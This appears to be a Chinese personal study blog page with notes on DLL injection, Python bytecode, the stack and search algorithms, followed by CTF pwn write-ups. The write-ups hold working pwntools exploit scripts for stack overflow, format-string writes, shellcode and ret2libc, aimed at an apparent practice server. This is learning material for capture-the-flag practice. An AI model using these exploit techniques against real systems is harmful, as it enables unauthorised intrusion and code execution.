@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/unnamed.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/photo.gif">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="eaKNHevzJD712W6CICpiQ4_TgpzOgFr3dBKOwg7Hqs4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"brubbish.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="DLL注入 DLL是一种模块共享和重用机制，可以被加载到其他进程中间执行。DLL注入目标进程不仅避免跨进程操作带来的繁琐过程，还可以直接执行自己的代码，进行hook、patch等操作 DLL注入方法 加载dll有三个时机：  在进程创建阶段加载输入表中的dll（即静态输入） 通过调用LoadLibrary(Ex)主动加载（动态加载） 系统机制要求加载基础服务模块（如shell扩展模块、网络服务接口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="8.20--9.04">
+<meta property="og:url" content="https://brubbish.github.io/17205.html">
+<meta property="og:site_name" content="Brubbish&#39;s">
+<meta property="og:description" content="DLL注入 DLL是一种模块共享和重用机制，可以被加载到其他进程中间执行。DLL注入目标进程不仅避免跨进程操作带来的繁琐过程，还可以直接执行自己的代码，进行hook、patch等操作 DLL注入方法 加载dll有三个时机：  在进程创建阶段加载输入表中的dll（即静态输入） 通过调用LoadLibrary(Ex)主动加载（动态加载） 系统机制要求加载基础服务模块（如shell扩展模块、网络服务接口">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-20T07:00:30.000Z">
+<meta property="article:modified_time" content="2020-11-28T01:55:20.839Z">
+<meta property="article:author" content="Bruce">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://brubbish.github.io/17205.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://brubbish.github.io/17205.html","path":"17205.html","title":"8.20--9.04"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>8.20--9.04 | Brubbish's</title><meta name="robots" content="noindex">
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-153514659-2"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-153514659-2","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Brubbish's</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-book-list"><a href="/books/" rel="section"><i class="fa fa-bookmark fa-fw"></i>书单</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="6634125020"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+      </div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">DLL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">DLL注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%B9%B2%E9%A2%84%E8%BE%93%E5%85%A5%E8%A1%A8%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E5%8A%A0%E8%BD%BD%E7%9B%AE%E6%A0%87dll"><span class="nav-number">1.1.1.</span> <span class="nav-text">通过干预输入表处理过程加载目标dll</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%B9%E5%8F%98%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E4%BD%BF%E5%85%B6%E4%B8%BB%E5%8A%A8%E5%8A%A0%E8%BD%BD%E7%9B%AE%E6%A0%87dll"><span class="nav-number">1.1.2.</span> <span class="nav-text">改变程序运行流程使其主动加载目标dll</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">python程序的执行过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80"><span class="nav-number">2.1.</span> <span class="nav-text">解释型语言和编译型语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PyCodeObject%E5%92%8Cpyc"><span class="nav-number">2.2.</span> <span class="nav-text">PyCodeObject和pyc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pyc"><span class="nav-number">2.3.</span> <span class="nav-text">pyc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">逆向工程核心原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88"><span class="nav-number">3.1.</span> <span class="nav-text">栈</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%95%8A%E5%93%88%E7%AE%97%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">啊哈算法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2"><span class="nav-number">4.1.</span> <span class="nav-text">深度优先搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2"><span class="nav-number">4.2.</span> <span class="nav-text">广度优先搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-overflow"><span class="nav-number">4.3.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#string"><span class="nav-number">4.4.</span> <span class="nav-text">string</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CGfsb"><span class="nav-number">4.5.</span> <span class="nav-text">CGfsb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cgpwn2"><span class="nav-number">4.6.</span> <span class="nav-text">cgpwn2</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bruce</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+
+
+
+
+<!-- sidebar -->
+    </div>
+
+
+
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://brubbish.github.io/17205.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bruce">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Brubbish's">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          8.20--9.04
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-08-20 15:00:30" itemprop="dateCreated datePublished" datetime="2020-08-20T15:00:30+08:00">2020-08-20</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-11-28 09:55:20" itemprop="dateModified" datetime="2020-11-28T09:55:20+08:00">2020-11-28</time>
+      </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="DLL注入">DLL注入</h2>
+<p>DLL是一种模块共享和重用机制，可以被加载到其他进程中间执行。DLL注入目标进程不仅避免跨进程操作带来的繁琐过程，还可以直接执行自己的代码，进行hook、patch等操作</p>
+<h3 id="DLL注入方法">DLL注入方法</h3>
+<p>加载dll有三个时机：</p>
+<ol>
+<li>在进程创建阶段加载输入表中的dll（即静态输入）</li>
+<li>通过调用LoadLibrary(Ex)主动加载（动态加载）</li>
+<li>系统机制要求加载基础服务模块（如shell扩展模块、网络服务接口模块等）</li>
+</ol>
+<h4 id="通过干预输入表处理过程加载目标dll">通过干预输入表处理过程加载目标dll</h4>
+<p>进程创建阶段会进行处理并加载输入表中的DLL模块。<br>
+首先执行的是ntdll.dll中的函数，进行初始化，再加载输入表中的模块，并填充应用程序的IAT。因此只要输入表被处理前进行干预，为输入表增加一个项目，指向要加载的目标dll，或者替换原输入表中的dll，那么新进程的主线程在输入表初始化阶段就会主动加载目标dll</p>
+<h4 id="改变程序运行流程使其主动加载目标dll">改变程序运行流程使其主动加载目标dll</h4>
+<p>程序运行的容器是进程，真正活动的是其中的线程。改变流程的做法通常是改变eip、创建新线程或修改目标进程内的代码，使其执行LoadLibrary(Ex)来加载目标dll</p>
+<h2 id="python程序的执行过程">python程序的执行过程</h2>
+<h3 id="解释型语言和编译型语言">解释型语言和编译型语言</h3>
+<p>运行高级语言写成的程序时，需要通过<em>编译</em>或者<em>解释</em>，把高级语言转变成机器语言<br>
+编译型语言在程序执行前，会通过编译器对代码进行编译，把代码变成机器语言的文件（如.exe），以后可以直接执行<br>
+解释型语言把源代码翻译成中间代码，运行时再由解释器对中间代码进行解释运行</p>
+<h3 id="PyCodeObject和pyc">PyCodeObject和pyc</h3>
+<p>python程序的<strong>编译</strong>结果位于PyCodeObject，当程序运行结束时解释器将PyCodeObject写到pyc文件中，程序第二次运行时，会在硬盘中寻找pyc文件，如果找到就可以直接载入。</p>
+<blockquote>
+<p>pyc文件是PyCodeObject在硬盘上的表现形式</p>
+</blockquote>
+<p>python解释器只把可能重用到的模块持久化成pyc文件，并认为只有import进来的模块才是需要被重用的</p>
+<h3 id="pyc">pyc</h3>
+<p>pyc文件也称为字节码文件<br>
+一个pyc文件包含了：magic number、pyc文件创建时间、PyCodeObject</p>
+<p>参考：</p>
+<ol>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3VveXVhbnBpbmcvcC8xMDUyNDA5OC5odG1s">https://www.cnblogs.com/guoyuanping/p/10524098.html<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcmVzdHJhbi9wLzQ5MDMwNTYuaHRtbA==">https://www.cnblogs.com/restran/p/4903056.html<i class="fa fa-external-link-alt"></i></span></li>
+</ol>
+<h2 id="逆向工程核心原理">逆向工程核心原理</h2>
+<h3 id="栈">栈</h3>
+<p>栈通常用于储存局部变量、传递函数参数、保存函数返回地址等<br>
+栈由高地址向低地址扩展</p>
+<h2 id="啊哈算法">啊哈算法</h2>
+<h3 id="深度优先搜索">深度优先搜索</h3>
+<p>基本模型：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line">    判断边界;</span><br><span class="line">    <span class="comment">/*尝试每一种可能*/</span> <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*下一步*/</span><span class="built_in">dfs</span>(step+<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一直朝一边尝试，直到不通再返回尝试另一边。可以通过递归实现</p>
+<h3 id="广度优先搜索">广度优先搜索</h3>
+<p>记录每个点四周可以走到的点，并放进队列，判断完一个点后将点出队，直到达到“出口”</p>
+<h3 id="int-overflow">int_overflow</h3>
+<p>用ida打开程序之后可以看到正常运行时的这几个函数</p>
+<p>其中login()里的buf和check_passwd()似乎有点问题。<br>
+在函数窗口还发现了一个函数“what_is_this”，打开之后发现这个函数执行之后直接&quot;cat flag&quot;了，应该就是我们栈溢出之后跳转的目标</p>
+<p>看一下check的过程。先把s（即之前输入的buf）的长度赋给v3，检验v3的长度是否在3~8，然后最关键的来了：</p>
+<blockquote>
+<p>result = strcpy(&amp;dest,s)</p>
+</blockquote>
+<p>因此要做的就是在strcpy的时候把返回的地址覆盖为“what_is_this”的地址<br>
+dest所在的栈长这样：<br>
+所以我们要从0x14一直覆盖到返回地址（共0x18个字节），然后把返回地址覆盖为0x0804868B<br>
+“可是这样长度就超过8了哎…”<br>
+我们注意到v3的类型是无符号int8，范围从0~2^8-1(即255)，而buf读入的长度为0x199（dec-409），可以通过整数溢出的方式，在返回地址后面再输入一些字符，使buf的长度在3~8之间</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">56818</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">a = <span class="string">&quot;1&quot;</span>*<span class="number">0x18</span> + p32(<span class="number">0x0804868B</span>) + <span class="string">&#x27;1&#x27;</span>* <span class="number">232</span></span><br><span class="line">p.sendline(a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTczMDYz">PWN——那些年坑过我们的数据类型<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="string">string</h3>
+<p>参考：<br>
+<span class="exturl" data-url="aHR0cHM6Ly92ZXJpdGFzNTAxLnNwYWNlLzIwMTcvMDQvMjgvJUU2JUEwJUJDJUU1JUJDJThGJUU1JThDJTk2JUU1JUFEJTk3JUU3JUFDJUE2JUU0JUI4JUIyJUU2JUJDJThGJUU2JUI0JTlFJUU1JUFEJUE2JUU0JUI5JUEwLw==">https://veritas501.space/2017/04/28/格式化字符串漏洞学习/<i class="fa fa-external-link-alt"></i></span><br>
+<span class="exturl" data-url="aHR0cDovL2Jsb2cuaXl6eWkuY29tL2luZGV4LnBocC9hcmNoaXZlcy81NTcvIzB4MDJDR2ZzYg==">http://blog.iyzyi.com/index.php/archives/557/#0x02CGfsb<i class="fa fa-external-link-alt"></i></span><br>
+<span class="exturl" data-url="aHR0cHM6Ly9pbnRyb3NwZWxsaWFtLmdpdGh1Yi5pby8yMDE3LzA4LzA0L3ByaW50ZiVFNiVBMCVCQyVFNSVCQyU4RiVFNSU4QyU5NiVFNiVCQyU4RiVFNiVCNCU5RS8=">https://introspelliam.github.io/2017/08/04/printf格式化漏洞/<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">30800</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;character&#x27;s name be:&quot;</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;up?:&quot;</span>, <span class="string">&quot;east&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;or leave(0)?:&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;address&quot;</span>, <span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># p.sendlineafter(&quot;And, you wish is:&quot;, &#x27;aaaa&#x27;+&#x27;-%p&#x27;*10)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>, <span class="string">&#x27;%85c%7$n&#x27;</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;I hear it&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="CGfsb">CGfsb</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">49459</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">a = p32(<span class="number">0x0804A068</span>) + <span class="string">&#x27;1111&#x27;</span> + <span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line">p.sendline(a)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#a = &quot;1&quot;*0x228 + &quot;1&quot;*0x4 + p32(0x0804868B)</span></span><br><span class="line"><span class="comment">#p.sendline(a)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>参考：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLngxMHNlYy5vcmcvcHduL2ZtdHN0ci9mbXRzdHJfZXhwbG9pdC8=">https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="cgpwn2">cgpwn2</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">39614</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">a = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;4&#x27;</span>*<span class="number">4</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0x0804844B</span>) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">10</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">payload = <span class="string">&#x27;0&#x27;</span>*<span class="number">0x8c</span> + p32(addr-<span class="number">0x99a80</span>) + <span class="string">&#x27;1&#x27;</span>*<span class="number">4</span> + p32(addr+<span class="number">0x84c6b</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><!-- flag of hidden posts -->
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9waXNjZXMv">NexT.Pisces</span> 强力驱动
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="9629035599"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css" integrity="sha256-M6KFoDq9eUpmogkDgw6+3R3ZgUPSuFXnQyr8tskSfQs=" crossorigin="anonymous">
+
+
+
+</body>
+</html>
